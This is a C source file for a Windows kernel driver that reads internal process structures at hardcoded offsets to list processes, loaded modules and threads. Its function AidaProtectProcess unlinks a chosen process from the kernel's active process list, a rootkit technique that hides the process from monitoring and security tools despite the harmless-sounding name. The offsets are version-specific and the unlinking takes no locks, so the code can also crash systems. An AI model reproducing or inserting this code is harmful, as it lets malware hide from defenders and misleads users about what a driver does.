#include "Process.h"
#include <ntddk.h>

#define ACTIVE_PROCESS_LINKS_OFFSET  0x448
#define IMAGE_FILE_NAME_OFFSET       0x5A8
#define UNIQUE_PROCESS_ID_OFFSET     0x440
#define PEB_OFFSET                   0x550
#define THREAD_LIST_HEAD_OFFSET      0x5E0
#define THREAD_LIST_ENTRY_OFFSET     0x4E8
#define THREAD_CID_OFFSET            0x478

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    UCHAR Reserved1[2];
    UCHAR BeingDebugged;
    UCHAR Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, AidaEnumerateProcesses)
#pragma alloc_text(PAGE, AidaGetProcessModules)
#pragma alloc_text(PAGE, AidaProtectProcess)
#pragma alloc_text(PAGE, AidaGetProcessThreads)
#endif

NTSTATUS AidaEnumerateProcesses(
    PPROCESS_ENTRY Buffer,
    ULONG MaxCount,
    PULONG ActualCount)
{
    PAGED_CODE();

    PEPROCESS CurrentProcess = NULL;
    PEPROCESS InitialProcess = NULL;
    PLIST_ENTRY CurrentEntry;
    PLIST_ENTRY ListHead;
    ULONG Count = 0;
    NTSTATUS Status;

    if (Buffer == NULL || ActualCount == NULL || MaxCount == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    *ActualCount = 0;
    RtlZeroMemory(Buffer, MaxCount * sizeof(PROCESS_ENTRY));

    Status = PsLookupProcessByProcessId((HANDLE)4, &InitialProcess);
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    ListHead = (PLIST_ENTRY)((PUCHAR)InitialProcess + ACTIVE_PROCESS_LINKS_OFFSET);
    CurrentEntry = ListHead;

    do {
        CurrentProcess = (PEPROCESS)((PUCHAR)CurrentEntry - ACTIVE_PROCESS_LINKS_OFFSET);

        ULONG Pid = (ULONG)(ULONG_PTR)(*(PVOID*)((PUCHAR)CurrentProcess + UNIQUE_PROCESS_ID_OFFSET));
        PUCHAR ImageName = (PUCHAR)CurrentProcess + IMAGE_FILE_NAME_OFFSET;

        if (Pid != 0 && Count < MaxCount) {
            Buffer[Count].ProcessId = Pid;

            ANSI_STRING AnsiName;
            UNICODE_STRING UnicodeName;

            RtlInitAnsiString(&AnsiName, (PCSZ)ImageName);
            UnicodeName.Buffer = Buffer[Count].ProcessName;
            UnicodeName.Length = 0;
            UnicodeName.MaximumLength = (USHORT)(MAX_PROCESS_NAME_LENGTH * sizeof(WCHAR));

            RtlAnsiStringToUnicodeString(&UnicodeName, &AnsiName, FALSE);

            Count++;
        }

        CurrentEntry = CurrentEntry->Flink;
    } while (CurrentEntry != ListHead && Count < MaxCount);

    *ActualCount = Count;
    ObDereferenceObject(InitialProcess);
    return STATUS_SUCCESS;
}

NTSTATUS AidaGetProcessModules(
    ULONG ProcessId,
    PMODULE_ENTRY Buffer,
    ULONG MaxCount,
    PULONG ActualCount)
{
    PAGED_CODE();

    PEPROCESS TargetProcess = NULL;
    NTSTATUS Status;
    KAPC_STATE ApcState;
    PPEB Peb;
    PPEB_LDR_DATA LdrData;
    PLIST_ENTRY ListHead;
    PLIST_ENTRY CurrentEntry;
    ULONG Count = 0;

    if (Buffer == NULL || ActualCount == NULL || MaxCount == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    *ActualCount = 0;
    RtlZeroMemory(Buffer, MaxCount * sizeof(MODULE_ENTRY));

    Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &TargetProcess);
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    Peb = (PPEB)(*(PVOID*)((PUCHAR)TargetProcess + PEB_OFFSET));
    if (Peb == NULL) {
        ObDereferenceObject(TargetProcess);
        return STATUS_NOT_FOUND;
    }

    KeStackAttachProcess(TargetProcess, &ApcState);

    __try {
        LdrData = Peb->Ldr;
        if (LdrData == NULL) {
            __leave;
        }

        ListHead = &LdrData->InLoadOrderModuleList;
        CurrentEntry = ListHead->Flink;

        while (CurrentEntry != ListHead && Count < MaxCount) {
            PLDR_DATA_TABLE_ENTRY LdrEntry = CONTAINING_RECORD(
                CurrentEntry,
                LDR_DATA_TABLE_ENTRY,
                InLoadOrderLinks
            );

            Buffer[Count].BaseAddress = (ULONG64)LdrEntry->DllBase;
            Buffer[Count].Size = LdrEntry->SizeOfImage;

            if (LdrEntry->BaseDllName.Buffer != NULL && LdrEntry->BaseDllName.Length > 0) {
                USHORT CopyLength = LdrEntry->BaseDllName.Length;
                if (CopyLength > (MAX_MODULE_NAME_LENGTH - 1) * sizeof(WCHAR)) {
                    CopyLength = (MAX_MODULE_NAME_LENGTH - 1) * sizeof(WCHAR);
                }
                RtlCopyMemory(
                    Buffer[Count].ModuleName,
                    LdrEntry->BaseDllName.Buffer,
                    CopyLength
                );
                Buffer[Count].ModuleName[CopyLength / sizeof(WCHAR)] = L'\0';
            }

            Count++;
            CurrentEntry = CurrentEntry->Flink;
        }

        *ActualCount = Count;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        KeUnstackDetachProcess(&ApcState);
        ObDereferenceObject(TargetProcess);
        return GetExceptionCode();
    }

    KeUnstackDetachProcess(&ApcState);
    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}

NTSTATUS AidaProtectProcess(
    ULONG ProcessId)
{
    PAGED_CODE();

    PEPROCESS TargetProcess = NULL;
    NTSTATUS Status;
    PLIST_ENTRY ProcessLinks;

    Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &TargetProcess);
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    ProcessLinks = (PLIST_ENTRY)((PUCHAR)TargetProcess + ACTIVE_PROCESS_LINKS_OFFSET);

    ProcessLinks->Flink->Blink = ProcessLinks->Blink;
    ProcessLinks->Blink->Flink = ProcessLinks->Flink;

    ProcessLinks->Flink = ProcessLinks;
    ProcessLinks->Blink = ProcessLinks;

    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}

NTSTATUS AidaGetProcessThreads(
    ULONG ProcessId,
    PULONG ThreadIds,
    ULONG MaxCount,
    PULONG ActualCount)
{
    PAGED_CODE();

    PEPROCESS TargetProcess = NULL;
    NTSTATUS Status;
    PLIST_ENTRY ThreadListHead;
    PLIST_ENTRY CurrentEntry;
    ULONG Count = 0;

    if (ThreadIds == NULL || ActualCount == NULL || MaxCount == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    *ActualCount = 0;
    RtlZeroMemory(ThreadIds, MaxCount * sizeof(ULONG));

    Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &TargetProcess);
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    ThreadListHead = (PLIST_ENTRY)((PUCHAR)TargetProcess + THREAD_LIST_HEAD_OFFSET);
    CurrentEntry = ThreadListHead->Flink;

    __try {
        while (CurrentEntry != ThreadListHead && Count < MaxCount) {
            PUCHAR Thread = (PUCHAR)CurrentEntry - THREAD_LIST_ENTRY_OFFSET;

            ULONG ThreadId = (ULONG)(ULONG_PTR)(*(PVOID*)(Thread + THREAD_CID_OFFSET + sizeof(PVOID)));

            if (ThreadId != 0) {
                ThreadIds[Count] = ThreadId;
                Count++;
            }

            CurrentEntry = CurrentEntry->Flink;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        ObDereferenceObject(TargetProcess);
        return GetExceptionCode();
    }

    *ActualCount = Count;
    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}
